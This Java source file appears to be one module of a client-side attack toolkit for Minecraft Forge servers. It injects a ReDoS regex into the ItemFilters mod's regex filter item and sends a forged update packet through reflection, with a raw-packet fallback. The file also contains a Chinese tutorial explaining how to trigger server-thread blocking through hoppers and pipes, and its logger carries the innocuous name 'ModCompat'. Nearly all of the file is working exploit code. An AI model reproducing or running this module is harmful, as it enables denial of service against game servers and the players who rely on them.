package com.redblue.red.modules.itemfilters;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import net.minecraft.client.Minecraft;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.item.ItemStack;
import net.minecraftforge.fml.ModList;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.List;

/**
 * IF-002: ReDoS via RegExFilterItem.
 *
 * CONFIRMED via source verification:
 * RegExFilterItem.RegExData.fromString() calls Pattern.compile(s) with:
 *   - No length limit
 *   - No complexity check
 *   - No timeout mechanism
 *
 * When the filter is used in automation (hoppers/pipes), the malicious regex
 * is matched against every item's registry name, causing exponential backtracking.
 *
 * Attack vector: Same as IF-001 — construct MessageUpdateFilterItem with an
 * itemfilters:id_regex ItemStack whose NBT "value" contains a ReDoS pattern.
 * The StringValueData stores the value in the ItemStack's NBT tag.
 */
public class IF02_ReDoS implements AttackModule {

    private static final Logger LOGGER = LoggerFactory.getLogger("ModCompat");

    private static final String MSG_CLASS =
            "dev.latvian.mods.itemfilters.net.MessageUpdateFilterItem";

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("hand", "目标手",
                "MAIN_HAND", "MAIN_HAND", "OFF_HAND"),
        ConfigParam.ofEnum("pattern", "ReDoS模式",
                "EXPONENTIAL", "EXPONENTIAL", "POLYNOMIAL", "CUSTOM"),
        ConfigParam.ofString("custom_regex", "自定义正则", "")
                .visibleWhen("pattern", "CUSTOM"),
        ConfigParam.ofInt("repeat_depth", "嵌套深度", 999, 10, 9999)
                .visibleWhen("pattern", "EXPONENTIAL", "POLYNOMIAL")
    );

    // Predefined ReDoS patterns
    private static final String EXPONENTIAL_TEMPLATE = "(a{1,%d}){1,%d}b";
    private static final String POLYNOMIAL_TEMPLATE = "(%s)+$";

    @Override public String id() { return "if02_redos"; }
    @Override public String name() { return "正则DoS"; }

    @Override
    public String description() {
        return "向RegEx过滤器注入恶意正则表达式，触发ReDoS阻塞服务端线程";
    }

    @Override
    public String getTutorial() {
        return "[前提条件]\n"
            + "主手或副手必须持有 itemfilters:id_regex 过滤器\n\n"
            + "[攻击模式]\n"
            + "EXPONENTIAL: 指数级回溯 (a{1,N}){1,N}b\n"
            + "POLYNOMIAL: 多项式回溯 (a+)+$\n"
            + "CUSTOM: 自定义正则表达式\n\n"
            + "[触发条件]\n"
            + "注入后，当过滤器被用于自动化系统(漏斗/管道)时，\n"
            + "服务端对每个物品执行正则匹配，触发CPU密集回溯。\n\n"
            + "[注意]\n"
            + "需要过滤器被放入自动化系统才能触发DoS效果。\n"
            + "仅注入不会立即产生影响。";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("itemfilters");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;

        InteractionHand hand = getHand();
        ItemStack held = mc.player.getItemInHand(hand);
        if (held.isEmpty()) {
            LOGGER.warn("[IF02] 目标手中没有物品");
            return;
        }

        String regex = buildRegex();
        if (regex.isEmpty()) {
            LOGGER.warn("[IF02] 正则表达式为空");
            return;
        }

        // Build id_regex filter ItemStack with malicious value
        ItemStack payload = buildRegexFilter(regex);
        if (payload == null) return;

        sendUpdatePacket(hand, payload);
        LOGGER.info("[IF02] 已注入ReDoS正则: {} (长度={})",
                regex.substring(0, Math.min(50, regex.length())), regex.length());
    }

    private String buildRegex() {
        String mode = getParam("pattern").map(ConfigParam::getString).orElse("EXPONENTIAL");
        int depth = getParam("repeat_depth").map(ConfigParam::getInt).orElse(999);

        return switch (mode) {
            case "POLYNOMIAL" -> {
                // Build nested groups: ((((a+)+)+)+)$
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < Math.min(depth, 50); i++) sb.append("(");
                sb.append("a+");
                for (int i = 0; i < Math.min(depth, 50); i++) sb.append(")+");
                sb.append("$");
                yield sb.toString();
            }
            case "CUSTOM" -> getParam("custom_regex").map(ConfigParam::getString).orElse("");
            default -> // EXPONENTIAL
                    String.format(EXPONENTIAL_TEMPLATE, depth, depth);
        };
    }

    private ItemStack buildRegexFilter(String regex) {
        try {
            var rl = new net.minecraft.resources.ResourceLocation("itemfilters", "id_regex");
            var item = net.minecraftforge.registries.ForgeRegistries.ITEMS.getValue(rl);
            if (item == null || item == net.minecraft.world.item.Items.AIR) {
                LOGGER.warn("[IF02] 找不到 itemfilters:id_regex");
                return null;
            }

            ItemStack stack = new ItemStack(item, 1);

            // StringValueData stores value via ItemFiltersStack mixin.
            // The NBT key used by StringValueData is "value" stored in
            // the stack's tag. We set it directly.
            net.minecraft.nbt.CompoundTag tag = new net.minecraft.nbt.CompoundTag();
            tag.putString("value", regex);
            stack.setTag(tag);

            return stack;
        } catch (Exception e) {
            LOGGER.error("[IF02] buildRegexFilter failed", e);
            return null;
        }
    }

    private InteractionHand getHand() {
        String h = getParam("hand").map(ConfigParam::getString).orElse("MAIN_HAND");
        return "OFF_HAND".equals(h) ? InteractionHand.OFF_HAND : InteractionHand.MAIN_HAND;
    }

    private void sendUpdatePacket(InteractionHand hand, ItemStack stack) {
        try {
            Class<?> msgClass = Class.forName(MSG_CLASS);
            Constructor<?> ctor = msgClass.getDeclaredConstructor(
                    InteractionHand.class, ItemStack.class);
            ctor.setAccessible(true);
            Object msg = ctor.newInstance(hand, stack);

            Method sendMethod = msgClass.getDeclaredMethod("send");
            sendMethod.setAccessible(true);
            sendMethod.invoke(msg);
        } catch (Exception e) {
            LOGGER.error("[IF02] 反射发包失败，回退到原始发包", e);
            sendRawFallback(hand, stack);
        }
    }

    private void sendRawFallback(InteractionHand hand, ItemStack stack) {
        try {
            String className = MSG_CLASS;
            java.util.UUID uuid = java.util.UUID.nameUUIDFromBytes(
                    className.getBytes(java.nio.charset.StandardCharsets.UTF_8));
            String idSuffix = uuid.toString().replace("-", "");
            var packetId = new net.minecraft.resources.ResourceLocation(
                    "itemfilters:main/" + idSuffix);
            var archChannel = new net.minecraft.resources.ResourceLocation(
                    "architectury", "network");

            com.redblue.red.util.PacketForge.send(archChannel, buf -> {
                buf.writeResourceLocation(packetId);
                buf.writeBoolean(hand == InteractionHand.MAIN_HAND);
                buf.writeItem(stack);
            });
        } catch (Exception e) {
            LOGGER.error("[IF02] 原始发包也失败了", e);
        }
    }
}
